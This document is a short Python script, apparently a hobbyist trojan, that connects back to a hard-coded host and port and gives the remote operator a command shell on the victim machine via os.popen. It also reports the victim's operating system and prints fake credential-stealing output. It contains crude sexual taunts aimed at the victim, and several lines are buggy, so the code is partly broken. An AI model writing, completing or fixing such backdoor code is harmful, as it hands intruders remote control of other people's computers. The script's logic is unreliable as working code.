import socket
import threading
import os
import subprocess
import time


def trojan():
    HOST = '192.168.56.1'
    PORT = 9090
    operating_sys = os.name
    commands = ["cmdon", "cmdoff", "exit", "scare", "help", "getos"]

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False

    while True:
        command = client.recv(1024).decode('utf-8')
        if not command in commands:
            if cmd_mode:
                pass
            else:
                client.send("[-] Unknown command".encode('utf-8'))
        if command == "cmdon":
            cmd_mode = True
            client.send("Terminal access = True".encode('utf-8'))
        if command == "cmdoff":
            cmd_mode = False
            client.send("Terminal terminated".encode('utf-8'))
        if cmd_mode:
            client.recv(1024).decode('utf-8')
            output = os.popen(command)
            # send the results back to the server
            client.send(output.encode('utf-8'))
            continue
        if command == "creds":
            client.send("uploading laZagne\nrunning LaZagne\nchrome______\nLogin: yessir69yes@gmail.com: FuckingScuffed1!".encode('utf-8'))
        else:
            if command == "" or None:
                client.send("Please enter an command".encode('utf-8'))
            if command == "exit":
                break
            if command == "scare":
                print("I like your Porn-Taste :=)") #fixen
                client.send("Received scare".encode('utf-8'))
            if command == "help":
                client.send("Send nudes".encode('utf-8'))
            if command == "getos":
                if operating_sys == "nt":
                    client.send("Victim runs Windows".encode('utf-8'))
                elif operating_sys == "posix":
                    client.send("Victim runs Linux".encode('utf-8'))
                else:
                    client.send("Os coulndt be identified".encode('utf-8'))
trojan()
